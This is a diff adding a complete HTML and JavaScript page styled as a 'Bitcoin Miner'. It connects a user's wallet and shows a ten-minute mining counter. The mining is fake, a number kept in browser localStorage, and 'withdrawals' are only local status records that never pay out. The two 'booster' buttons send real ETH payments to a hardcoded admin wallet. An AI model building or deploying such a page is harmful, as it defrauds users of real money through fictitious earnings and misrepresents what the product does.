@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>💰 Bitcoin Miner 💰</title>
+  <style>
+    /* Base Beautification Styles */
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      background: #1a1a1a;
+      color: white;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+    h1 {
+      font-size: 2.5rem;
+      background: linear-gradient(45deg, #FFD700, #FFA500);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 20px;
+    }
+    /* Coin Animation */
+    .coin {
+      width: 200px;
+      height: 200px;
+      position: relative;
+      transform-style: preserve-3d;
+      animation: rotate 3s infinite linear;
+      margin-bottom: 20px;
+    }
+    .coin-face {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      backface-visibility: hidden;
+      border-radius: 50%;
+    }
+    .coin-back {
+      transform: rotateY(180deg) scaleX(-1);
+    }
+    .coin-face img {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+    @keyframes rotate {
+      to { transform: rotateY(360deg); }
+    }
+    /* App UI Styles */
+    #walletInfo {
+      margin-top: 10px;
+      font-weight: bold;
+    }
+    button {
+      padding: 10px 15px;
+      margin: 5px 0;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      background: #FFA500;
+      color: #1a1a1a;
+      font-weight: bold;
+    }
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    #miner, #adminPanel {
+      display: none;
+      width: 90%;
+      max-width: 600px;
+      margin: 20px 0;
+      padding: 15px;
+      border: 1px solid #555;
+      border-radius: 5px;
+      background: #333;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 10px;
+      background: #222;
+    }
+    table, th, td {
+      border: 1px solid #555;
+    }
+    th, td {
+      padding: 8px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <!-- Header & Coin Animation -->
+  <h1>Bitcoin Miner $BTC</h1>
+  <div class="coin">
+    <div class="coin-face">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin Coin Front">
+    </div>
+    <div class="coin-face coin-back">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin Coin Back">
+    </div>
+  </div>
+
+  <!-- Connect Wallet & Miner Interface -->
+  <button id="connectWalletBtn">Connect Wallet 🔌</button>
+  <div id="walletInfo"></div>
+
+  <div id="miner">
+    <h2>Miner Interface ⚒️</h2>
+    <p>Mined BTC: <span id="minedAmount">0</span> BTC 💰</p>
+    <p>Time Remaining: <span id="timeRemaining">10:00</span> ⏳</p>
+    <button id="startMiningBtn">Start Mining ⛏️</button>
+    <button id="withdrawBtn" disabled>Withdraw Mined BTC 💵</button>
+    <br><br>
+    <!-- Booster 1 -->
+    <button id="purchaseBoosterBtn">Purchase Booster 1 (0.030 ETH) 🚀</button>
+    <p>Your Booster 1 Count: <span id="boosterCount">0</span> 🔥</p>
+    <!-- Booster 2 -->
+    <button id="purchaseBooster2Btn">Purchase Booster 2 (0.060 ETH) 🚀</button>
+    <p>Your Booster 2 Count: <span id="boosterCount2">0</span> 🔥</p>
+
+    <!-- User Withdrawal History -->
+    <div id="userWithdrawalHistory" style="display:none;">
+      <h3>Your Withdrawal History 💳</h3>
+      <table id="userWithdrawalTable">
+        <thead>
+          <tr>
+            <th>Amount (BTC)</th>
+            <th>Status</th>
+          </tr>
+        </thead>
+        <tbody><!-- Withdrawal records will load here --></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Admin Panel -->
+  <div id="adminPanel">
+    <h2>Admin Panel 🛠️</h2>
+    <h3>All Withdrawal Requests 📋</h3>
+    <table id="adminWithdrawalTable">
+      <thead>
+        <tr>
+          <th>User Wallet</th>
+          <th>Amount (BTC)</th>
+          <th>Status</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody><!-- Admin withdrawal records will load here --></tbody>
+    </table>
+  </div>
+
+  <!-- WalletConnect Provider Library -->
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+
+  <!-- App Functionality Script -->
+  <script>
+    // Set admin wallet address (for admin panel and booster payments)
+    const adminAddress = "0xde45f6a59A96DaA0AE7f26BAd254aA88241b8D04";
+    // Minimum withdrawal threshold updated to 0.010000000000 BTC
+    const MIN_WITHDRAWAL = 0.010000000000;
+    // Booster 1 parameters
+    const BOOSTER_INCREMENT1 = 0.000000001000; // BTC per second per booster 1
+    const BOOSTER_COST_ETH1 = 0.030;             // Cost in ETH for booster 1
+    // Booster 2 parameters
+    const BOOSTER_INCREMENT2 = 0.000000002000; // BTC per second per booster 2
+    const BOOSTER_COST_ETH2 = 0.060;             // Cost in ETH for booster 2
+
+    // Base mining rate (BTC per second)
+    const BASE_RATE = 0.000000000138;
+
+    let userAccount = "";
+    let miningInterval;
+    let minedAmount = 0;
+    const miningDuration = 10 * 60; // 10 minutes in seconds
+    let sessionFinished = false;
+
+    // Data persistence using localStorage:
+    // withdrawals: mapping wallet addresses to arrays of withdrawal records.
+    // minedProgress: mapping wallet addresses to current session minedAmount.
+    // boosterCounts: mapping wallet addresses to number of booster 1 purchased.
+    // boosterCounts2: mapping wallet addresses to number of booster 2 purchased.
+    let withdrawals = JSON.parse(localStorage.getItem('withdrawals')) || {};
+    let minedProgress = JSON.parse(localStorage.getItem('minedProgress')) || {};
+    let boosterCounts = JSON.parse(localStorage.getItem('boosterCounts')) || {};
+    let boosterCounts2 = JSON.parse(localStorage.getItem('boosterCounts2')) || {};
+
+    // Save data to localStorage
+    function saveData() {
+      localStorage.setItem('withdrawals', JSON.stringify(withdrawals));
+      localStorage.setItem('minedProgress', JSON.stringify(minedProgress));
+      localStorage.setItem('boosterCounts', JSON.stringify(boosterCounts));
+      localStorage.setItem('boosterCounts2', JSON.stringify(boosterCounts2));
+    }
+
+    // Load the current user's mining progress and booster counts from localStorage
+    function loadUserData() {
+      minedAmount = minedProgress[userAccount] || 0;
+      document.getElementById('minedAmount').innerText = minedAmount.toFixed(12);
+      document.getElementById('boosterCount').innerText = boosterCounts[userAccount] || 0;
+      document.getElementById('boosterCount2').innerText = boosterCounts2[userAccount] || 0;
+    }
+
+    // Connect wallet: use injected provider if available, otherwise fallback to WalletConnect.
+    document.getElementById('connectWalletBtn').addEventListener('click', async function() {
+      if (window.ethereum) {
+        try {
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          userAccount = accounts[0].toLowerCase();
+          onWalletConnected();
+        } catch (error) {
+          console.error(error);
+          alert("Wallet connection failed! ❌");
+        }
+      } else {
+        try {
+          const walletConnectProvider = new WalletConnectProvider.default({
+            infuraId: "YOUR_INFURA_ID" // Replace with your Infura ID
+          });
+          await walletConnectProvider.enable();
+          const accounts = walletConnectProvider.accounts;
+          userAccount = accounts[0].toLowerCase();
+          onWalletConnected();
+        } catch (error) {
+          console.error(error);
+          alert("Wallet connection failed! Please install Trust Wallet or a compatible wallet app. ❌");
+        }
+      }
+    });
+
+    // Runs after wallet is connected
+    function onWalletConnected() {
+      document.getElementById('walletInfo').innerText = "Connected: " + userAccount;
+      document.getElementById('miner').style.display = "block";
+      document.getElementById('userWithdrawalHistory').style.display = "block";
+      if (userAccount === adminAddress.toLowerCase()) {
+        document.getElementById('adminPanel').style.display = "block";
+      }
+      loadUserData();
+      updateUserWithdrawalTable();
+      updateAdminWithdrawalTable();
+    }
+
+    // Start a mining session
+    function startMiningSession() {
+      let secondsPassed = 0;
+      document.getElementById('startMiningBtn').disabled = true;
+      document.getElementById('startMiningBtn').innerText = "Mining in progress... ⏳";
+      
+      miningInterval = setInterval(() => {
+        secondsPassed++;
+        // Effective rate = base rate + booster 1 bonus + booster 2 bonus
+        let effectiveRate = BASE_RATE +
+          ((boosterCounts[userAccount] || 0) * BOOSTER_INCREMENT1) +
+          ((boosterCounts2[userAccount] || 0) * BOOSTER_INCREMENT2);
+        minedAmount += effectiveRate;
+        document.getElementById('minedAmount').innerText = minedAmount.toFixed(12);
+        minedProgress[userAccount] = minedAmount;
+        
+        let remaining = miningDuration - secondsPassed;
+        let minutes = Math.floor(remaining / 60);
+        let seconds = remaining % 60;
+        document.getElementById('timeRemaining').innerText =
+          `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        
+        if (secondsPassed >= miningDuration) {
+          clearInterval(miningInterval);
+          document.getElementById('withdrawBtn').disabled = false;
+          document.getElementById('startMiningBtn').disabled = false;
+          document.getElementById('startMiningBtn').innerText = "Start New Session ⛏️";
+          sessionFinished = true;
+          saveData();
+        }
+      }, 1000);
+    }
+
+    // Start mining button event. If a finished session exists, prompt to save it as pending.
+    document.getElementById('startMiningBtn').addEventListener('click', function() {
+      if (sessionFinished && minedAmount > 0) {
+        const confirmSave = confirm("Your finished session mined " + minedAmount.toFixed(12) + " BTC 💰. " +
+                                      "This will be saved as a pending withdrawal before starting a new session. Proceed?");
+        if (confirmSave) {
+          if (!withdrawals[userAccount]) withdrawals[userAccount] = [];
+          withdrawals[userAccount].push({ amount: minedAmount, status: "pending" });
+          updateUserWithdrawalTable();
+          updateAdminWithdrawalTable();
+          minedAmount = 0;
+          document.getElementById('minedAmount').innerText = "0";
+          sessionFinished = false;
+          saveData();
+        } else {
+          return;
+        }
+      }
+      startMiningSession();
+    });
+
+    // Withdraw button event.
+    document.getElementById('withdrawBtn').addEventListener('click', function() {
+      if (minedAmount < MIN_WITHDRAWAL) {
+        alert("You must have at least " + MIN_WITHDRAWAL.toFixed(12) + " BTC to withdraw. ⛔");
+        return;
+      }
+      let withdrawAmount = prompt("Enter withdrawal amount (available: " + minedAmount.toFixed(12) + " BTC):");
+      withdrawAmount = parseFloat(withdrawAmount);
+      if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
+        alert("Invalid withdrawal amount. ⛔");
+        return;
+      }
+      if (withdrawAmount > minedAmount) {
+        alert("Withdrawal amount exceeds available mined balance. ⛔");
+        return;
+      }
+      if (withdrawAmount < MIN_WITHDRAWAL) {
+        alert("Minimum withdrawal is " + MIN_WITHDRAWAL.toFixed(12) + " BTC. ⛔");
+        return;
+      }
+      if (!withdrawals[userAccount]) withdrawals[userAccount] = [];
+      withdrawals[userAccount].push({ amount: withdrawAmount, status: 'pending' });
+      alert("Your withdrawal request for " + withdrawAmount.toFixed(12) + " BTC is pending admin approval. ⏳");
+      minedAmount -= withdrawAmount;
+      document.getElementById('minedAmount').innerText = minedAmount.toFixed(12);
+      minedProgress[userAccount] = minedAmount;
+      saveData();
+      updateUserWithdrawalTable();
+      updateAdminWithdrawalTable();
+    });
+
+    // Purchase Booster 1 button event.
+    document.getElementById('purchaseBoosterBtn').addEventListener('click', async function() {
+      if (!window.ethereum) {
+        alert("No Ethereum provider available. ⛔");
+        return;
+      }
+      const valueWei = BigInt(Math.floor(BOOSTER_COST_ETH1 * 1e18)).toString(16);
+      const txParams = {
+        from: userAccount,
+        to: adminAddress,
+        value: "0x" + valueWei
+      };
+      try {
+        const txHash = await window.ethereum.request({
+          method: "eth_sendTransaction",
+          params: [txParams]
+        });
+        alert("Booster 1 purchase transaction sent: " + txHash + " 🚀");
+        boosterCounts[userAccount] = (boosterCounts[userAccount] || 0) + 1;
+        document.getElementById('boosterCount').innerText = boosterCounts[userAccount];
+        saveData();
+      } catch (error) {
+        console.error(error);
+        alert("Booster 1 purchase failed: " + error.message + " ⛔");
+      }
+    });
+
+    // Purchase Booster 2 button event.
+    document.getElementById('purchaseBooster2Btn').addEventListener('click', async function() {
+      if (!window.ethereum) {
+        alert("No Ethereum provider available. ⛔");
+        return;
+      }
+      const valueWei = BigInt(Math.floor(BOOSTER_COST_ETH2 * 1e18)).toString(16);
+      const txParams = {
+        from: userAccount,
+        to: adminAddress,
+        value: "0x" + valueWei
+      };
+      try {
+        const txHash = await window.ethereum.request({
+          method: "eth_sendTransaction",
+          params: [txParams]
+        });
+        alert("Booster 2 purchase transaction sent: " + txHash + " 🚀");
+        boosterCounts2[userAccount] = (boosterCounts2[userAccount] || 0) + 1;
+        document.getElementById('boosterCount2').innerText = boosterCounts2[userAccount];
+        saveData();
+      } catch (error) {
+        console.error(error);
+        alert("Booster 2 purchase failed: " + error.message + " ⛔");
+      }
+    });
+
+    // Update the user's withdrawal table
+    function updateUserWithdrawalTable() {
+      const tableBody = document.querySelector("#userWithdrawalTable tbody");
+      tableBody.innerHTML = "";
+      const userRecords = withdrawals[userAccount] || [];
+      userRecords.forEach(record => {
+        const row = document.createElement("tr");
+        row.innerHTML = `<td>${record.amount.toFixed(12)}</td><td>${record.status}</td>`;
+        tableBody.appendChild(row);
+      });
+    }
+
+    // Update the admin panel withdrawal table
+    function updateAdminWithdrawalTable() {
+      const tableBody = document.querySelector("#adminWithdrawalTable tbody");
+      tableBody.innerHTML = "";
+      for (const [wallet, records] of Object.entries(withdrawals)) {
+        records.forEach((record, index) => {
+          const row = document.createElement("tr");
+          row.innerHTML = `
+            <td>${wallet}</td>
+            <td>${record.amount.toFixed(12)}</td>
+            <td>${record.status}</td>
+            <td>
+              <button onclick="copyWallet('${wallet}')">Copy 📋</button>
+              ${record.status === 'pending' ? `<button onclick="approveWithdrawal('${wallet}', ${index})">Approve ✅</button>` : ''}
+            </td>
+          `;
+          tableBody.appendChild(row);
+        });
+      }
+    }
+
+    // Copy wallet address to clipboard
+    function copyWallet(wallet) {
+      navigator.clipboard.writeText(wallet)
+        .then(() => alert("Wallet address copied: " + wallet + " 📋"))
+        .catch(() => alert("Failed to copy wallet address. ⛔"));
+    }
+
+    // Approve a withdrawal (admin only)
+    function approveWithdrawal(wallet, index) {
+      withdrawals[wallet][index].status = 'approved';
+      saveData();
+      updateUserWithdrawalTable();
+      updateAdminWithdrawalTable();
+    }
+  </script>
+</body>
+</html>
